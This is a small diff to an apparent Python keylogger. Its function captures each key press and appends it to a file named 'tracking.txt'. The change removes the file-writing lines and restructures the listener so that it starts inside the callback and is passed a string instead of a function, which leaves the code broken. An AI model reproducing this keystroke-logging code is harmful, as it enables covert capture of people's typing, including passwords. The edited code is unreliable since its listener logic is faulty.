@@ -17,9 +17,10 @@ def from_keyboard_to_file(key):
     key_data = str(key)
     key_data = key_data.replace("'", " ")
 
-    with open("tracking.txt","a") as the_file:
-        the_file.write(key_data)
+    
 
-with Listener (on_press = from_keyboard_to_file) as l:
-     l.join()
+    with Listener (on_press = key_data) as l:
+         l.join()
+
+    return l
 
